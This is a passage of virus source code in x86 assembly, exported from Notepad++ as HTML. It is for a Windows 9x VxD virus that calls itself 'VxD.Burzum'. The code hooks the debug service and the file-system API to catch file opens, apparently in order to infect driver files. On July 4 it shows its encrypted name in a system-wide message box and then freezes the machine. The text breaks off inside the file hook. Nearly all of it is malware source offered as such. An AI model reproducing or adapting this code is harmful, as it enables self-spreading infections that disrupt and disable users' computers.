<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.386p</span><span class="sc0">

</span><span class="sc5">MASM</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;Needed for IFS.INC</span><span class="sc0">

</span><span class="sc9">.XList</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">VMM.INC</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">IFS.INC</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">IFSMGR.INC</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">SHELL.INC</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.INC</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">LE.INC</span><span class="sc0">
</span><span class="sc9">.List</span><span class="sc0">

</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">BURZUM_DDB</span><span class="sc0">

</span><span class="sc5">Return_IP_Distance</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0"> </span><span class="sc1">;Fix</span><span class="sc0">
</span><span class="sc5">Loader_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0"> </span><span class="sc1">;Fix</span><span class="sc0">
</span><span class="sc5">Control_Distance</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">Virus_Control</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc0">
</span><span class="sc5">Virus_Main_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">Virus_Main_End</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc0">
</span><span class="sc5">Virus_Physical_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">Virus_Physical_End</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc0">
</span><span class="sc5">Virus_Virtual_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">Virus_Virtual_End</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc0">
</span><span class="sc5">HB_Sign</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'HB'</span><span class="sc0"> </span><span class="sc1">;"Horned Beast"</span><span class="sc0">
</span><span class="sc5">Min_Page_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">Max_Page_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">
</span><span class="sc5">Payload_Day</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Payload_Month</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">VxD_CODE_SEG</span><span class="sc0">

</span><span class="sc5">Return_Control</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Burzum_Control</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Virus_Control</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Fake_Start</span><span class="sc0">

</span><span class="sc5">BURZUM_DDB</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc0"> </span><span class="sc4">&lt;,,,,,,</span><span class="sc3">"BURZUM"</span><span class="sc4">,,</span><span class="sc5">Burzum_Control</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc1">;Simulate host execution</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">$.DDB_Reserved1</span><span class="sc4">-(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Fake_Start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Test_Debug_Installed</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Fake_Start</span><span class="sc4">-</span><span class="sc5">Return_Control</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Dword_Align</span><span class="sc0">

</span><span class="sc5">Virus_Start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Return_IP</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc5">Return_IP_Distance</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">R_MODE.INC</span><span class="sc0">

</span><span class="sc5">Virus_Control</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Start_Delta</span><span class="sc0">
</span><span class="sc5">Start_Delta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Fix_Dynamic_Links</span><span class="sc0">
</span><span class="sc1">;Install debug hook</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Debug_Hook</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Old_Debug</span><span class="sc4">-</span><span class="sc5">Debug_Hook</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-(</span><span class="sc5">Debug_Hook</span><span class="sc4">-</span><span class="sc5">Old_Debug_Pointer</span><span class="sc4">)],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">GetVxDServiceOrdinal</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Test_Debug_Installed</span><span class="sc0">
</span><span class="sc5">Dynamic_Link1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Hook_Device_Service</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Pushad_Struc</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;Return address</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Subtract call size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Pushad_Struc</span><span class="sc4">)],</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;Adjust return address</span><span class="sc0">
</span><span class="sc1">;Fix "Test_Debug_Installed" call</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">Dyna_Link_Int</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">@@Test_Debug_Installed</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Compare_Offset</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;Simulate a HOOK_PROC</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Debug_Hook</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Old_Debug</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Old_Debug_Pointer</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Debug_Hook</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushfd</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Pushad_Struc</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Return address</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Debug_Exit</span><span class="sc0"> </span><span class="sc1">;Not a virus call</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;"Test_Debug_Installed" call address</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Pushad_Struc</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;Fix return address</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Compare_Offset</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Fix_Reference</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INIT_COMPLETE</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Return_to_Host</span><span class="sc0">
</span><span class="sc1">;Install file hook</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Debug_Delta</span><span class="sc0">
</span><span class="sc5">Debug_Delta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Disable_Hook</span><span class="sc4">-</span><span class="sc5">Debug_Delta</span><span class="sc4">)],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Hook</span><span class="sc4">-</span><span class="sc5">Debug_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Dynamic_Link4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Old_File</span><span class="sc4">-</span><span class="sc5">Debug_Delta</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;The payload</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Payload_Day</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Return_to_Host</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Payload_Month</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Return_to_Host</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Name</span><span class="sc4">-</span><span class="sc5">Debug_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">Decrypt_Name</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Decrypt_Name</span><span class="sc0">
</span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Get_Sys_VM_Handle</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Message box flags</span><span class="sc0">
</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">SHELL_SYSMODAL_Message</span><span class="sc0"> </span><span class="sc1">;Display virus name</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc1">;Hang execution</span><span class="sc0">
</span><span class="sc5">Fix_Reference</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Same as: cmp eax,SYS_CRITICAL_INIT</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Return_to_Host</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Reference data</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">Return_to_Host</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">popfd</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Debug_Exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">popfd</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Old_Debug</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Virus_Name</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc2">72</span><span class="sc4">,</span><span class="sc2">36</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc4">,</span><span class="sc2">74</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">36</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc4">,</span><span class="sc2">73</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc4">,</span><span class="sc2">52</span><span class="sc4">,</span><span class="sc2">102</span><span class="sc0">
</span><span class="sc1">;Encrypted "VxD.Burzum, Horned Beast/VADER",0</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">File_Hook</span><span class="sc4">,</span><span class="sc5">CCALL</span><span class="sc4">,</span><span class="sc5">HIGH_FREQ</span><span class="sc0">

</span><span class="sc5">ArgVar</span><span class="sc0"> </span><span class="sc5">FSDFnAddr</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">ArgVar</span><span class="sc0"> </span><span class="sc5">FunctionNum</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">ArgVar</span><span class="sc0"> </span><span class="sc5">Drive</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">ArgVar</span><span class="sc0"> </span><span class="sc5">ResourceFlags</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">ArgVar</span><span class="sc0"> </span><span class="sc5">CodePage</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">ArgVar</span><span class="sc0"> </span><span class="sc5">pir</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">

</span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">LE_Info_Mem</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">LE_Header_File</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">LE_Info_File</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">LE_Info_Size</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">DDB_Offset_File</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">File_Handle</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">

</span><span class="sc5">EnterProc</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">Disable_Hook</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">File_Hook_Exit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FunctionNum</span><span class="sc4">],</span><span class="sc5">IFSFN_OPEN</span><span class="sc0"> </span><span class="sc1">;Function</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">File_Hook_Exit</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">File_Delta</span><span class="sc0">
</span><span class="sc5">File_Delta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Disable_Hook</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Drive</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Drive number</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">No_Drive</span><span class="sc0"> </span><span class="sc1">;UNC resource</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">No_Drive</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pir</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Pointer to IOREQ</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_ppath</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ParsedPath.pp_elements</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">BCS_WANSI</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Virus_Virtual_End</span><span class="sc4">-</span><span class="sc5">Virus_Physical_End</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Dynamic_Link5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
